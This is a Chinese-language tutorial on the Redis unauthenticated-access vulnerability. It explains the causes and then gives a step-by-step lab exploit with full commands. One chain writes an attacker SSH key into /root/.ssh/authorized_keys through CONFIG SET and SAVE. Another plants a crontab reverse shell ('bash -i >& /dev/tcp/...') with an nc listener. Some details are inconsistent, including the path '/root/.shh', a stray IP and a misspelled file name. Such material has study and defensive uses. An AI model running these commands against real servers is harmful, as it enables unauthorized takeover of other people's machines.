---
sort: 5
---

# redis 未授权访问漏洞

## 什么是 Redis 未授权访问漏洞？

Redis 在默认情况下，会绑定在`0.0.0.0:6379`。如果没有采取相关的安全策略，比如添加防火墙规则、避免其他非信任来源 IP 访问等，这样会使 Redis 服务完全暴露在公网上。如果在没有设置密码认证(一般为空)的情况下，会导致任意用户在访问目标服务器时，可以在未授权的情况下访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行文件的读写等操作。攻击者可以成功地将自己的 ssh 公钥写入到目标服务器的 `/root/.ssh`文件夹下的`authotrized_keys`文件中，进而可以使用对应地私钥直接使用 ssh 服务登录目标服务器。

简单来讲，我们可以将漏洞的产生归结为两点:

> - redis 绑定在 `0.0.0.0:6379`，且没有进行添加防火墙规则、避免其他非信任来源 IP 访问等相关安全策略，直接暴露在公网上

> - 没有设置密码认证(一般为空)，可以免密码远程登录 redis 服务

漏洞可能产生的危害:

> - 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行 flushall 来清空所有数据

> - 攻击者可通过 EVAL 执行 lua 代码，或通过数据备份功能往磁盘写入后门文件

> - 如果 Redis 以 root 身份运行，黑客可以给 root 账户写入 SSH 公钥文件，直接通过 SSH 登录受害者服务器

## 复现漏洞利用场景

1. 假设 Ubuntu 为虚拟机 A，Kali Linux 为虚拟机 B。虚拟机 A(192.168.152.133)为受害者的主机，虚拟机 B（192.168.152.131）为攻击者的主机.
2. 在攻击机中 B 生成 ssh 公钥，密码设置为空。公钥保存在`/home/username/.ssh`中

```
ssh-keygen -t rsa
```

3. 将公钥保存到另一个文件中：

```
# 开头结尾的两个换行是必须的
(echo -e "\n\n";cat id_rsa.pub; echo -e "\n\n") > kitty.txt
```

4. 将`kitty.txt`写入 redis 服务器

```
cat kitty.txt | redis-cli -h 192.168.152.133 -x set crack
```

我们使用-h 参数来指定远程 Redis 服务器 IP，这样 redis-cli 就可以进行连接并发送命令。-x 参数后的语句意思是，设置 redis 中 s-key 密钥的值为 kitty.txt。

5. 远程登录主机 A 的 redis 服务:redis-cli -h 192.168.0.146 并使用`config get dir`命令得到 redis 备份的路径

```
root@kali:~/.ssh# redis-cli -h 192.168.152.133
192.168.152.133:6379> config get dir
1) "dir"
2) "/home/python/.ssh"
```

6. 更改 redis 备份路径为 ssh 公钥存放目录（一般默认为`/root/.ssh`）：

```
config set dir /root/.shh
```

7. 设置备份文件名为`authotrized_keys`并保存，至此我们已经将攻击机的 ssh 公钥写入了靶机中

```
192.168.152.133:6379> config set dbfilename authorized_keys
OK
192.168.152.133:6379> config get dbfilename
1) "dbfilename"
2) "authorized_keys"
192.168.152.133:6379> save
OK
192.168.152.133:6379> exit
```

8. 使用 ssh 证书登录靶机：

```
root@kali:~/.ssh# ssh -i id_rsa root@192.168.152.133
```

## 利用计划任务反弹 shell

在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell

先在自己的服务器上监听一个端口

```
nc -lvnp 7999
```

然后执行命令:

    root@kali:~# redis-cli -h 192.168.63.130
    192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
    OK
    192.168.63.130:6379> config set dir /var/spool/cron/
    OK
    192.168.63.130:6379> config set dbfilename root
    OK
    192.168.63.130:6379> save
    OK
